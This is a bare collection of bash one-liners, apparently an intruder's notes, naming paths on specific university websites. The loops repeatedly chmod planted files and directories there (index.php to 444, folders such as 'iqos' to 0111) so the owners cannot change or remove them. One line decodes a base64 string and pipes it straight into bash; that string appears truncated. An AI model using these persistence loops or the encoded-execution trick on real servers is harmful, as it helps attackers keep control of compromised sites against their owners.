#!/bin/bash

WATCH_DIR="/home/pariwisata/public_html/bulan/"

while true; do
    find "$WATCH_DIR" -type d ! -perm 755 -exec chmod 755 {} \;
    sleep 5
done
=================================================================


while true; do find /var/www/html/bestjournal.untad.ac.id/pages/sui/ -type d ! -perm 555 -exec chmod 555 {} \;; sleep 2; done

while true; do find /var/www/html/bestjournal.untad.ac.id/index.php -type f ! -perm 444 -exec chmod 444 {} \;; sleep 1; done


=================================================================

VERSI BASE64 :

echo "sZWVwIDE7IGRvbmU=" | base64 --decode | bash

================================================================

VERSI TERMINAL ONLY
while true; do find /home/unidayan-informatika/htdocs/informatika.unidayan.ac.id/public/build/iqos/ -type d ! -perm 0111 -exec chmod 0111 {} \;; sleep 1; done

chmod all :
find /path/to/directory -type f -print0 | xargs -0 chmod 444
find /path/to/directory -type d -print0 | xargs -0 chmod 555
